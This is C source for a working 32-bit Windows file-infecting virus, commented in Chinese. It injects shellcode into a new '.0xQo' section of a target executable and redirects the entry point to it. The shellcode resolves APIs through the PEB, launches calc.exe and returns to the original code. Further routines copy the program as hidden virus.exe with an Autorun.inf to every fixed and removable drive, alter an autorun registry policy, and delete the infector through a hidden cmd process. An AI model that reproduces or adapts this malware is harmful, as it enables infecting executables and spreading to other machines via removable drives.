#include <windows.h>
#include <stdio.h>

//恶意代码入口
#pragma code_seg(".payload")
#pragma comment(linker, "/SECTION:.payload,RWE")
#pragma optimize("", off)

// 【EntryPoint】：仅4字节OEP占位，感染器运行时写入原OEP绝对地址
void __declspec(naked) EntryPoint(){
	__asm{
		__emit 0x00
		__emit 0x00
		__emit 0x00
		__emit 0x00
	}
}

// 【BeginPoint】：shellcode真正入口，新EP指向这里
void __declspec(naked) BeginPoint() {
	__asm{
		// ====================================
		// [第1步] 代码重定位（获取运行时delta）
		// ====================================
		call get_eip
	get_eip:
		pop ebx                         // EBX = runtime address of get_eip label
		sub ebx, offset BeginPoint      // EBX = runtime_get_eip - static_BeginPoint
		sub ebx, 5                      // EBX = delta (runtime - compile_time)

		// ====================================
		// [第2步] 通过PEB获取Kernel32.dll基址
		// FS:[0x30]->PEB->Ldr->InInitializationOrderModuleList
		// 顺序: ntdll -> kernel32 -> ...
		// ====================================
		mov eax, fs:[0x30]              // PEB
		mov eax, [eax + 0x0C]          // PEB.Ldr
		mov esi, [eax + 0x1C]          // Ldr.InInitializationOrderModuleList.Flink
		lodsd                           // EAX = 第1个模块(ntdll)的链表节点
		mov eax, [eax]                  // EAX = 第2个模块(kernel32)的链表节点
		mov edi, [eax + 0x08]          // EDI = Kernel32基址

		// ====================================
		// [第3步] 解析导出表，查找GetProcAddress
		// ====================================
		mov eax, [edi + 0x3C]          // e_lfanew
		add eax, edi
		mov eax, [eax + 0x78]          // 导出表RVA
		add eax, edi
		mov esi, eax                    // ESI = 导出表VA

		mov ecx, [esi + 0x18]          // NumberOfNames
		mov edx, [esi + 0x20]          // AddressOfNames RVA
		add edx, edi                    // EDX = AddressOfNames VA

	find_gpa_loop:
		dec ecx
		js gpa_not_found
		mov eax, [edx + ecx * 4]
		add eax, edi
		cmp dword ptr [eax],     0x50746547  // "GetP"
		jne find_gpa_loop
		cmp dword ptr [eax + 4], 0x41636F72  // "rocA"
		jne find_gpa_loop
		cmp dword ptr [eax + 8], 0x65726464  // "ddre"
		jne find_gpa_loop
		cmp word  ptr [eax + 12], 0x7373     // "ss"
		jne find_gpa_loop

		// 通过序号表和函数表取得函数地址
		mov edx, [esi + 0x24]          // AddressOfNameOrdinals RVA
		add edx, edi
		movzx ecx, word ptr [edx + ecx * 2]
		mov edx, [esi + 0x1C]          // AddressOfFunctions RVA
		add edx, edi
		mov eax, [edx + ecx * 4]
		add eax, edi
		mov ebp, eax                    // EBP = GetProcAddress (全程保存)
		jmp gpa_found

	gpa_not_found:
		int 3                           // 调试断点

	gpa_found:
		// ====================================
		// [第4步] 获取 LoadLibraryA
		// ====================================
		xor ecx, ecx
		push ecx
		push 0x41797261                 // "aryA"
		push 0x7262694C                 // "Libr"
		push 0x64616F4C                 // "Load"
		mov eax, esp                    // EAX = "LoadLibraryA"
		push eax                        // arg2: lpProcName
		push edi                        // arg1: kernel32
		call ebp                        // GetProcAddress(kernel32, "LoadLibraryA")
		add esp, 16                     // 清理字符串(4 DWORD)
		mov esi, eax                    // ESI = LoadLibraryA

		// ====================================
		// [第5步] 加载 shell32.dll
		// ====================================
		xor ecx, ecx
		push ecx
		push 0x006C6C64                 // "dll\0"
		push 0x2E32336C                 // "l32."
		push 0x6C656873                 // "shel"
		mov eax, esp                    // EAX = "shell32.dll"
		push eax                        // arg1: lpLibFileName
		call esi                        // LoadLibraryA("shell32.dll")
		add esp, 16                     // 清理字符串(4 DWORD)
		mov edi, eax                    // EDI = shell32基址

		// ====================================
		// [第6步] 获取 ShellExecuteA
		// ====================================
		xor ecx, ecx
		push ecx
		push 0x00000041                 // "A\0\0\0"
		push 0x65747563                 // "cute"
		push 0x6578456C                 // "lExe"
		push 0x6C656853                 // "Shel"
		mov eax, esp                    // EAX = "ShellExecuteA"
		push eax                        // arg2: lpProcName
		push edi                        // arg1: shell32
		call ebp                        // GetProcAddress(shell32, "ShellExecuteA")
		add esp, 20                     // 清理字符串(5 DWORD)
		mov esi, eax                    // ESI = ShellExecuteA

		// ====================================
		// [第7步] 调用 ShellExecuteA 弹出calc.exe
		// ShellExecuteA(NULL,NULL,"calc.exe",NULL,NULL,SW_SHOW)
		// ====================================
		xor edx, edx
		push edx                        // null terminator
		push 0x6578652E                 // ".exe"
		push 0x636C6163                 // "calc"
		mov ecx, esp                    // ECX = "calc.exe"

		push 5                          // nShowCmd = SW_SHOW
		push edx                        // lpDirectory = NULL
		push edx                        // lpParameters = NULL
		push ecx                        // lpFile = "calc.exe"
		push edx                        // lpOperation = NULL
		push edx                        // hwnd = NULL
		call esi                        // ShellExecuteA(...) [stdcall 自清栈24字节]
		add esp, 12                     // 清理"calc.exe"字符串(3 DWORD)

		// ====================================
		// [第8步] 跳回原OEP（支持ASLR）
		// EntryPoint开头4字节存的是原OEP的RVA
		// 通过PEB.ImageBaseAddress获取运行时基址
		// ====================================

		// 读取存储的OEP RVA
		mov ecx, offset EntryPoint      // 静态地址(编译时)
		add ecx, ebx                    // + delta = 运行时EntryPoint地址
		mov ecx, [ecx]                  // = 存储的原OEP RVA

		// 从PEB获取运行时ImageBase（自动适配ASLR）
		mov eax, fs:[0x30]              // PEB
		mov eax, [eax + 0x08]          // PEB.ImageBaseAddress

		// 计算真实OEP并跳转
		add eax, ecx                    // runtime ImageBase + OEP RVA = 真实OEP
		jmp eax
	}
}

void __declspec(naked) EndPoint(){
	__asm ret
}

#pragma optimize("", on)
#pragma code_seg()

// ====================================
// 对齐宏
// ====================================
#define Align(x, align) (((x) + (align) - 1) & ~((align) - 1))

// ====================================
// PE感染函数
// ====================================
BOOL InfectPE(LPCSTR filePath)
{
	// 打开目标文件
	HANDLE hFile = CreateFileA(
		filePath, GENERIC_READ | GENERIC_WRITE,
		NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] 打开文件失败，错误码: %lu\n", GetLastError());
		return FALSE;
	}

	// 创建文件映射
	HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (hMapFile == NULL) {
		printf("[-] 创建映射失败，错误码: %lu\n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}

	// 映射到内存
	LPVOID pHdr = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if (pHdr == NULL) {
		printf("[-] 映射视图失败，错误码: %lu\n", GetLastError());
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	// ---- 验证 DOS 签名 ----
	IMAGE_DOS_HEADER *pDosHdr = (IMAGE_DOS_HEADER*)pHdr;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[-] 不是有效的PE文件（MZ签名错误）\n");
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}

	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + pDosHdr->e_lfanew);

	// ---- 验证 PE 签名 ----
	if (pNTHdr->Signature != IMAGE_NT_SIGNATURE) {
		printf("[-] 不是有效的PE文件（PE签名错误）\n");
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}

	// ---- 只支持32位x86 ----
	if (pNTHdr->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
		printf("[-] 不支持的架构: 0x%X（仅支持32位x86，此文件可能是64位）\n",
			pNTHdr->FileHeader.Machine);
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}
	if (pNTHdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
		printf("[-] 不是32位PE（Magic=0x%X）\n", pNTHdr->OptionalHeader.Magic);
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}

	// ---- 获取节区头指针 ----
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)(
		(PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));
	WORD wNumSec = pNTHdr->FileHeader.NumberOfSections;

	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[wNumSec - 1];
	IMAGE_SECTION_HEADER *pNewSec  = &pSecHdr[wNumSec];

	// ---- 检查是否已被感染（节名判断） ----
	for (WORD i = 0; i < wNumSec; i++) {
		if (memcmp(pSecHdr[i].Name, ".0xQo", 5) == 0) {
			printf("[-] 文件已被感染，跳过\n");
			UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
			return FALSE;
		}
	}

	// ---- 检查节区头空间是否足够 ----
	DWORD dwNewSecHdrEnd  = (DWORD)((PBYTE)(pNewSec + 1) - (PBYTE)pHdr);
	DWORD dwFirstSecOffset = pSecHdr[0].PointerToRawData;
	if (dwNewSecHdrEnd > dwFirstSecOffset) {
		printf("[-] PE头没有足够空间添加新节区头！\n");
		printf("    需要: %lu 字节，可用: %ld 字节\n",
			sizeof(IMAGE_SECTION_HEADER),
			(LONG)(dwFirstSecOffset - ((DWORD)((PBYTE)pNewSec - (PBYTE)pHdr))));
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}

	// ---- 计算shellcode大小和对齐 ----
	DWORD dwCodeSize  = (DWORD)EndPoint - (DWORD)&EntryPoint;
	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;
	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;

	// ---- 修正：VirtualSize为0时用SizeOfRawData代替 ----
	DWORD dwLastVirtSize = pLastSec->Misc.VirtualSize;
	if (dwLastVirtSize == 0) dwLastVirtSize = pLastSec->SizeOfRawData;

	// ---- 填充新节区头 ----
	memset(pNewSec, 0, sizeof(IMAGE_SECTION_HEADER));
	memcpy(pNewSec->Name, ".0xQo", 5);
	pNewSec->PointerToRawData = pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->VirtualAddress   = pLastSec->VirtualAddress + Align(dwLastVirtSize, dwSecAlign);
	pNewSec->SizeOfRawData    = Align(dwCodeSize, dwFileAlign);
	pNewSec->Misc.VirtualSize = Align(dwCodeSize, dwSecAlign);
	pNewSec->Characteristics  = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ |
	                            IMAGE_SCN_MEM_WRITE   | IMAGE_SCN_CNT_CODE;

	// ---- 更新PE头字段 ----
	pNTHdr->FileHeader.NumberOfSections++;
	pNTHdr->OptionalHeader.SizeOfCode  += pNewSec->Misc.VirtualSize;
	pNTHdr->OptionalHeader.SizeOfImage += pNewSec->Misc.VirtualSize;

	// ---- 写入shellcode到新节 ----
	DWORD dwWritten = 0;
	SetFilePointer(hFile, pNewSec->PointerToRawData, NULL, FILE_BEGIN);
	WriteFile(hFile, &EntryPoint, pNewSec->SizeOfRawData, &dwWritten, NULL);
	SetEndOfFile(hFile);

	// ---- 将原OEP的RVA写到新节开头4字节（支持ASLR） ----
	DWORD dwOldOEP_RVA = pNTHdr->OptionalHeader.AddressOfEntryPoint;
	SetFilePointer(hFile, pNewSec->PointerToRawData, NULL, FILE_BEGIN);
	WriteFile(hFile, &dwOldOEP_RVA, 4, &dwWritten, NULL);

	// ---- 设置新OEP指向BeginPoint ----
	DWORD dwBeginOffset = (DWORD)BeginPoint - (DWORD)&EntryPoint;
	pNTHdr->OptionalHeader.AddressOfEntryPoint =
		pNewSec->VirtualAddress + dwBeginOffset;

	// ---- 刷新映射（写回PE头修改） ----
	FlushViewOfFile(pHdr, 0);

	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	printf("[+] 感染完成: %s\n", filePath);
	printf("    原OEP RVA     : 0x%08X\n", dwOldOEP_RVA);
	printf("    新EP RVA      : 0x%08X\n", pNewSec->VirtualAddress + dwBeginOffset);
	printf("    BeginPoint偏移 : %lu 字节\n", dwBeginOffset);
	return TRUE;
}

// ====================================
// 感染各驱动盘
// ====================================
BOOL InfectDriver(void)
{
	for (char ch = 'A'; ch <= 'Z'; ch++) {
		char path[MAX_PATH] = { ch, ':' };
		UINT driveType = GetDriveTypeA(path);
		if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
			char p[MAX_PATH] = { 0 };
			memcpy(p, path, 2);

			char virusPath[MAX_PATH] = { 0 };
			memcpy(virusPath, path, 2);
			strcat(virusPath, "\\virus.exe");

			char selfPath[MAX_PATH] = { 0 };
			GetModuleFileNameA(NULL, selfPath, MAX_PATH);
			CopyFileA(selfPath, virusPath, FALSE);
			SetFileAttributesA(virusPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

			char autorunPath[MAX_PATH] = { 0 };
			memcpy(autorunPath, path, 2);
			strcat(autorunPath, "\\Autorun.inf");
			DeleteFileA(autorunPath);

			FILE *fp = fopen(autorunPath, "a");
			if (fp) {
				fputs("[Autorun]\r\n"
				      "OPEN=virus.exe\r\n"
				      "shell\\open=打开(&O)\r\n"
				      "shell\\open\\Command=virus.exe\r\n"
				      "shell\\open\\Default=1\r\n"
				      "shell\\explore=资源管理器(&X)\r\n"
				      "shell\\explore\\Command=virus.exe\r\n", fp);
				fclose(fp);
				SetFileAttributesA(autorunPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
			}
		}
	}
	return TRUE;
}

// ====================================
// 修改注册表，禁止自动播放
// ====================================
BOOL SetAutorun(void)
{
	HKEY hKey;
	long iret = RegOpenKey(HKEY_CURRENT_USER,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey);
	if (iret != ERROR_SUCCESS) return FALSE;
	DWORD dwValue = 145;
	iret = RegSetValueEx(hKey, L"NoDriveTypeAutorun", NULL,
		REG_DWORD, (PBYTE)&dwValue, 4);
	RegCloseKey(hKey);
	return iret == ERROR_SUCCESS;
}

// ====================================
// 自删除
// ====================================
BOOL SelfDelete(void)
{
	char szModule[MAX_PATH];
	char szComspec[MAX_PATH];
	char szParams[MAX_PATH];

	if (GetModuleFileNameA(0, szModule, MAX_PATH) == 0) return FALSE;
	if (GetShortPathNameA(szModule, szModule, MAX_PATH) == 0) return FALSE;
	if (GetEnvironmentVariableA("COMSPEC", szComspec, MAX_PATH) == 0) return FALSE;

	lstrcpyA(szParams, " /c del ");
	lstrcatA(szParams, szModule);
	lstrcatA(szParams, " > nul");
	lstrcatA(szComspec, szParams);

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);  // 注意：用GetCurrentThread()

	if (CreateProcessA(0, szComspec, 0, 0, 0,
		CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
	{
		SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
		SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);
		ResumeThread(pi.hThread);
		return TRUE;
	}

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
	return FALSE;
}

// ====================================
// 主函数
// ====================================
int main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("用法: infector.exe <目标PE文件路径>\n");
		return 1;
	}
	InfectPE(argv[1]);
	SelfDelete();
	return 0;
}
